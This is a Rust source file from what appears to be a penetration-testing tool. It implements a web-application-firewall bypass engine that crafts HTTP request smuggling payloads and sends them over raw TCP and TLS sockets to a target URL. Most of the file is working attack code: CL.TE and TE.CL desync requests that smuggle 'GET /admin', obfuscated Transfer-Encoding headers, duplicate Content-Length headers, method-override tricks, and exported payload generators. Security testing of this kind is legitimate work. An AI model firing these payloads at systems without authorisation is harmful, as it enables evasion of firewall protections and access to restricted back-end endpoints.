use crate::constants::waf;
use crate::error::Result;
use reqwest::Client;
use rustls::pki_types::ServerName;
use rustls::ClientConfig;
use rustls::RootCertStore;
use std::time::Duration;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::time::timeout;
use tokio_rustls::TlsConnector;

use super::{BypassResult, BypassTechnique, WafProfile};
use crate::waf::detector::WafDetectionResult;

/// HTTP smuggling bypass using raw TCP sockets.
///
/// Note: The `profile` field is accepted for API consistency with other bypass engines
/// but is not currently used. Smuggling techniques use fixed payloads and raw sockets
/// rather than profile-specific configurations. Profile-based smuggling customization
/// is a future enhancement.
pub struct SmugglingBypass {
    _profile: Option<WafProfile>,
}

#[derive(Debug, Clone)]
pub enum SmugglingType {
    ClTe,
    TeCl,
    ChunkedMalformed,
    RequestTunneling,
    #[allow(dead_code)]
    H2CUpgrade,
    #[allow(dead_code)]
    Http2Frame,
    DoubleContentLength,
    MultipartMixed,
}

#[derive(Debug, Clone)]
pub struct SmugglingRequest {
    pub smuggling_type: SmugglingType,
    pub method: String,
    pub path: String,
    pub headers: Vec<(String, String)>,
    pub body: Vec<u8>,
    pub description: String,
}

impl SmugglingBypass {
    pub fn new(profile: Option<WafProfile>) -> Self {
        Self { _profile: profile }
    }

    pub async fn run(
        &self,
        _client: &Client,
        url: &str,
        detection: &WafDetectionResult,
    ) -> Result<Vec<BypassResult>> {
        let mut results = Vec::new();
        let normalized_url = crate::waf::WafDetector::normalize_url_static(url);

        let smuggling_requests = self.generate_smuggling_requests(&normalized_url);

        for smug_req in smuggling_requests {
            let technique = Self::technique_for_type(&smug_req.smuggling_type);
            match self
                .test_smuggling(&normalized_url, &smug_req, detection)
                .await
            {
                Ok(result) => results.push(result),
                Err(e) => {
                    results.push(BypassResult {
                        technique,
                        success: false,
                        description: format!("{} - Error: {}", smug_req.description, e),
                        payload: None,
                        status_code: 0,
                        response_diff: None,
                        error: Some(e.to_string()),
                    });
                }
            }
        }

        Ok(results)
    }

    fn generate_smuggling_requests(&self, url: &str) -> Vec<SmugglingRequest> {
        let parsed = url::Url::parse(url).ok();
        let path = parsed.as_ref().map(|u| u.path()).unwrap_or("/");

        let mut requests = Vec::with_capacity(6);

        let smuggled = "GET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n";
        let clte_body = format!("0\r\n\r\n{}", smuggled);
        // Content-Length must cover only the chunk-encoded portion ("0\r\n\r\n" = 5 bytes),
        // not the smuggled payload. The front-end processes based on CL; the back-end
        // uses Transfer-Encoding.
        let chunk_encoded_len = "0\r\n\r\n".len();
        requests.push(SmugglingRequest {
            smuggling_type: SmugglingType::ClTe,
            method: "POST".to_string(),
            path: path.to_string(),
            headers: vec![
                ("Content-Length".to_string(), format!("{}", chunk_encoded_len)),
                ("Transfer-Encoding".to_string(), "chunked".to_string()),
            ],
            body: clte_body.into_bytes(),
            description: "CL.TE: Content-Length vs Transfer-Encoding".to_string(),
        });

        requests.push(SmugglingRequest {
            smuggling_type: SmugglingType::TeCl,
            method: "POST".to_string(),
            path: path.to_string(),
            headers: vec![("Transfer-Encoding".to_string(), "chunked".to_string())],
            body: b"5\r\nhello\r\n0\r\n\r\n".to_vec(),
            description: "TE.CL: Chunked encoding test".to_string(),
        });

        requests.push(SmugglingRequest {
            smuggling_type: SmugglingType::ChunkedMalformed,
            method: "POST".to_string(),
            path: path.to_string(),
            headers: vec![("Transfer-Encoding".to_string(), "chunked".to_string())],
            body: b"1\r\na\r\n1\r\nb\r\n0\r\n\r\n".to_vec(),
            description: "Chunked: Small chunks".to_string(),
        });

        requests.push(SmugglingRequest {
            smuggling_type: SmugglingType::ClTe,
            method: "POST".to_string(),
            path: path.to_string(),
            headers: vec![("Content-Length".to_string(), "6".to_string())],
            body: b"0\r\n\r\nG".to_vec(),
            description: "CL: Incomplete body".to_string(),
        });

        requests.push(SmugglingRequest {
            smuggling_type: SmugglingType::TeCl,
            method: "POST".to_string(),
            path: path.to_string(),
            headers: vec![("Transfer-Encoding".to_string(), "xchunked".to_string())],
            body: b"5\r\nhello\r\n0\r\n\r\n".to_vec(),
            description: "TE: Malformed chunked encoding".to_string(),
        });

        requests.push(SmugglingRequest {
            smuggling_type: SmugglingType::TeCl,
            method: "POST".to_string(),
            path: path.to_string(),
            headers: vec![("Transfer-Encoding".to_string(), " chunked".to_string())],
            body: b"5\r\nhello\r\n0\r\n\r\n".to_vec(),
            description: "TE: Space prefix in header".to_string(),
        });

        requests.push(SmugglingRequest {
            smuggling_type: SmugglingType::ClTe,
            method: "POST".to_string(),
            path: path.to_string(),
            headers: vec![
                ("Content-Length".to_string(), "5".to_string()),
                ("X-HTTP-Method-Override".to_string(), "PUT".to_string()),
            ],
            body: b"hello".to_vec(),
            description: "Method override smuggling".to_string(),
        });

        requests.extend(self.generate_advanced_smuggling(path));

        requests
    }

    fn generate_advanced_smuggling(&self, path: &str) -> Vec<SmugglingRequest> {
        let mut requests = Vec::new();

        requests.push(SmugglingRequest {
            smuggling_type: SmugglingType::DoubleContentLength,
            method: "POST".to_string(),
            path: path.to_string(),
            headers: vec![
                ("Content-Length".to_string(), "5".to_string()),
                ("Content-Length".to_string(), "10".to_string()),
            ],
            body: b"hello".to_vec(),
            description: "Double Content-Length header".to_string(),
        });

        let tunnel_body = "GET /admin HTTP/1.1\r\nHost: localhost\r\nX-WAF-Bypass: true\r\n\r\n";
        requests.push(SmugglingRequest {
            smuggling_type: SmugglingType::RequestTunneling,
            method: "POST".to_string(),
            path: path.to_string(),
            headers: vec![(
                "Content-Length".to_string(),
                format!("{}", tunnel_body.len()),
            )],
            body: tunnel_body.as_bytes().to_vec(),
            description: "Request tunneling via body".to_string(),
        });

        requests.push(SmugglingRequest {
            smuggling_type: SmugglingType::MultipartMixed,
            method: "POST".to_string(),
            path: path.to_string(),
            headers: vec![
                ("Content-Type".to_string(), "multipart/form-data; boundary=----WebKitFormBoundary".to_string()),
            ],
            body: "------WebKitFormBoundary\r\nContent-Disposition: form-data; name=\"_method\"\r\n\r\nPUT\r\n------WebKitFormBoundary\r\nContent-Disposition: form-data; name=\"url\"\r\n\r\n/admin\r\n------WebKitFormBoundary--\r\n".as_bytes().to_vec(),
            description: "Multipart method override".to_string(),
        });

        if Self::supports_http2_probes() {
            requests.push(SmugglingRequest {
                smuggling_type: SmugglingType::H2CUpgrade,
                method: "GET".to_string(),
                path: path.to_string(),
                headers: vec![
                    (
                        "Connection".to_string(),
                        "Upgrade, HTTP2-Settings".to_string(),
                    ),
                    ("Upgrade".to_string(), "h2c".to_string()),
                    ("HTTP2-Settings".to_string(), "AAMAAABkAAQAap__".to_string()),
                ],
                body: vec![],
                description: "HTTP/2 cleartext (h2c) upgrade".to_string(),
            });
        }

        requests.push(SmugglingRequest {
            smuggling_type: SmugglingType::ChunkedMalformed,
            method: "POST".to_string(),
            path: path.to_string(),
            headers: vec![("Transfer-Encoding".to_string(), "chunked".to_string())],
            body: "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n"
                .as_bytes()
                .to_vec(),
            description: "Chunked with smuggled request in body".to_string(),
        });

        requests.push(SmugglingRequest {
            smuggling_type: SmugglingType::ChunkedMalformed,
            method: "POST".to_string(),
            path: path.to_string(),
            headers: vec![("Transfer-Encoding".to_string(), "chunked".to_string())],
            body: "G\r\nGET /admin HTTP/1.1\r\nHost: target\r\n\r\n0\r\n\r\n"
                .as_bytes()
                .to_vec(),
            description: "Invalid chunk size prefix".to_string(),
        });

        requests.push(SmugglingRequest {
            smuggling_type: SmugglingType::TeCl,
            method: "POST".to_string(),
            path: path.to_string(),
            headers: vec![("Transfer-Encoding".to_string(), "chunked".to_string())],
            body: "0\r\n\r\n\r\nGET /admin HTTP/1.1\r\nHost: target\r\n\r\n"
                .as_bytes()
                .to_vec(),
            description: "TE.CL with trailing headers".to_string(),
        });

        requests
    }

    async fn test_smuggling(
        &self,
        url: &str,
        req: &SmugglingRequest,
        detection: &WafDetectionResult,
    ) -> Result<BypassResult> {
        let requires_http2 = Self::requires_http2_probe(&req.smuggling_type);
        let (status, body, description_suffix) = if requires_http2 {
            (
                0,
                String::new(),
                format!(
                    "skipped: HTTP/2 probe requested but support unavailable (http2_probe_supported={})",
                    Self::supports_http2_probes()
                ),
            )
        } else {
            let (status, body) = self.execute_raw_http1(url, req).await?;
            (status, body, "raw socket HTTP/1.1 validation".to_string())
        };

        let success = !requires_http2 && self.is_bypass_successful(status, detection, "", &body);

        let technique = Self::technique_for_type(&req.smuggling_type);

        Ok(BypassResult {
            technique,
            success,
            description: format!("{} [{}]", req.description, description_suffix),
            payload: None,
            status_code: status,
            response_diff: None,
            error: None,
        })
    }

    fn technique_for_type(smuggling_type: &SmugglingType) -> BypassTechnique {
        match smuggling_type {
            SmugglingType::ClTe => BypassTechnique::ContentLengthConflict,
            SmugglingType::TeCl => BypassTechnique::TransferEncodingConflict,
            SmugglingType::ChunkedMalformed => BypassTechnique::ChunkedEncoding,
            SmugglingType::RequestTunneling => BypassTechnique::HeaderManipulation,
            SmugglingType::H2CUpgrade => BypassTechnique::EncodingBypass,
            SmugglingType::Http2Frame => BypassTechnique::EncodingBypass,
            SmugglingType::DoubleContentLength => BypassTechnique::ContentLengthConflict,
            SmugglingType::MultipartMixed => BypassTechnique::HeaderManipulation,
        }
    }

    fn supports_http2_probes() -> bool {
        // HTTP/2 smuggling support requires:
        // - HTTP/2 connection preface detection (h2c upgrade or prior knowledge)
        // - Frame manipulation capabilities (settings, window update frames)
        // - ALPN negotiation support
        // This is marked as a future enhancement pending proper HTTP/2 stack implementation
        false
    }

    fn requires_http2_probe(smuggling_type: &SmugglingType) -> bool {
        // This function is only invoked when supports_http2_probes() returns true.
        // Currently, H2CUpgrade and Http2Frame techniques are implemented but never
        // executed because HTTP/2 support is disabled pending a full HTTP/2 stack.
        matches!(
            smuggling_type,
            SmugglingType::H2CUpgrade | SmugglingType::Http2Frame
        )
    }

    async fn execute_raw_http1(
        &self,
        base_url: &str,
        req: &SmugglingRequest,
    ) -> Result<(u16, String)> {
        let base = url::Url::parse(base_url)?;
        let host = base.host_str().ok_or_else(|| {
            crate::error::EggsecError::Validation("Missing host in URL".to_string())
        })?;
        let scheme = base.scheme();
        let port = base.port_or_known_default().unwrap_or(match scheme {
            "https" => 443,
            _ => 80,
        });
        let authority = format!("{}:{}", host, port);
        let stream = timeout(
            Duration::from_secs(waf::SMUGGLING_TIMEOUT_SECS),
            TcpStream::connect(&authority),
        )
        .await??;

        let mut request_bytes = self.build_raw_request(host, req);
        let mut response = Vec::new();
        match scheme {
            "http" => {
                let mut plain = stream;
                plain.write_all(&request_bytes).await?;
                plain.flush().await?;
                timeout(
                    Duration::from_secs(waf::SMUGGLING_TIMEOUT_SECS),
                    plain.read_to_end(&mut response),
                )
                .await??;
            }
            "https" => {
                let connector = Self::build_tls_connector();
                let server_name = ServerName::try_from(host.to_string()).map_err(|e| {
                    crate::error::EggsecError::Validation(format!(
                        "Invalid TLS server name '{}': {}",
                        host, e
                    ))
                })?;
                let mut tls = timeout(
                    Duration::from_secs(waf::SMUGGLING_TIMEOUT_SECS),
                    connector.connect(server_name, stream),
                )
                .await
                .map_err(|_| crate::error::EggsecError::Timeout {
                    timeout_ms: waf::SMUGGLING_TIMEOUT_MS,
                    operation: format!("TLS connect {}", authority),
                })??;
                tls.write_all(&request_bytes).await?;
                tls.flush().await?;
                timeout(
                    Duration::from_secs(waf::SMUGGLING_TIMEOUT_SECS),
                    tls.read_to_end(&mut response),
                )
                .await??;
            }
            other => {
                return Err(crate::error::EggsecError::Validation(format!(
                    "Unsupported URL scheme for smuggling probe: {}",
                    other
                )));
            }
        }

        let status = Self::parse_status_code(&response).unwrap_or(0);
        let body = Self::extract_body(&response);

        request_bytes.fill(0);

        Ok((status, body))
    }

    fn build_tls_connector() -> TlsConnector {
        let mut roots = RootCertStore::empty();
        roots.extend(webpki_roots::TLS_SERVER_ROOTS.iter().cloned());
        let config = ClientConfig::builder()
            .with_root_certificates(roots)
            .with_no_client_auth();
        TlsConnector::from(std::sync::Arc::new(config))
    }

    fn build_raw_request(&self, host: &str, req: &SmugglingRequest) -> Vec<u8> {
        let mut raw = Vec::with_capacity(512 + req.body.len());
        raw.extend_from_slice(format!("{} {} HTTP/1.1\r\n", req.method, req.path).as_bytes());
        raw.extend_from_slice(format!("Host: {}\r\n", host).as_bytes());
        raw.extend_from_slice(
            format!(
                "User-Agent: {}\r\n",
                crate::waf::bypass::headers::get_random_ua()
            )
            .as_bytes(),
        );
        raw.extend_from_slice(b"Connection: close\r\n");
        for (key, value) in &req.headers {
            raw.extend_from_slice(format!("{}: {}\r\n", key, value).as_bytes());
        }
        raw.extend_from_slice(b"\r\n");
        raw.extend_from_slice(&req.body);
        raw
    }

    fn parse_status_code(response: &[u8]) -> Option<u16> {
        let status_line = response
            .split(|b| *b == b'\n')
            .next()
            .and_then(|line| std::str::from_utf8(line).ok())?;
        status_line
            .split_whitespace()
            .nth(1)
            .and_then(|code| code.parse::<u16>().ok())
    }

    fn extract_body(response: &[u8]) -> String {
        let split = b"\r\n\r\n";
        if let Some(pos) = response.windows(split.len()).position(|w| w == split) {
            return String::from_utf8_lossy(&response[(pos + split.len())..]).to_string();
        }
        String::new()
    }

    fn is_bypass_successful(
        &self,
        status: u16,
        detection: &WafDetectionResult,
        _payload: &str,
        response_body: &str,
    ) -> bool {
        super::is_bypass_successful(status, detection, "", response_body, None)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parse_status_code_from_raw_response() {
        let raw = b"HTTP/1.1 403 Forbidden\r\nServer: test\r\n\r\nblocked";
        assert_eq!(SmugglingBypass::parse_status_code(raw), Some(403));
    }

    #[test]
    fn extract_body_from_raw_response() {
        let raw = b"HTTP/1.1 200 OK\r\nServer: test\r\n\r\nhello";
        assert_eq!(SmugglingBypass::extract_body(raw), "hello".to_string());
    }
}

pub fn generate_cl_te_payloads() -> Vec<String> {
    vec![
        "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n".to_string(),
        "0\r\n\r\nGET /hidden HTTP/1.1\r\nHost: target\r\n\r\n".to_string(),
    ]
}

pub fn generate_te_cl_payloads() -> Vec<String> {
    vec![
        "5\r\nhello\r\n0\r\n\r\n".to_string(),
        "e\r\nGET / HTTP/1.1\r\n\r\n0\r\n\r\n".to_string(),
    ]
}
